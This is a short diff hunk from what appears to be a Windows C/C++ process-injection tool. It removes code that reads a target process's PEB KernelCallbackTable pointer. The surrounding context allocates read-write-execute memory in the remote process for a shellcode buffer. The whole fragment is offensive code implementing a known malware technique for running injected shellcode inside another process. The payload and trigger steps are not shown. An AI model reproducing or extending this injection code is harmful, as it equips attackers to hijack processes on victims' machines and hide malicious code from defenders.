@@ -55,15 +55,6 @@ int main(int argc, char* argv[])
 		return 1;
 	}
 
-	DWORD_PTR kernelCallbackTable;
-	if (!ReadProcessMemory(processHandle, peb.KernelCallbackTable, &kernelCallbackTable, sizeof(kernelCallbackTable), nullptr))
-	{
-		printf("[Error] %d - Failed to read KernelCallbackTable\n", GetLastError());
-		return 1;
-	}
-
-	printf("[Info] - Found kernel callback table at %p\n", kernelCallbackTable);
-
 	LPVOID remoteShellcodeMemory = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!remoteShellcodeMemory)
 	{
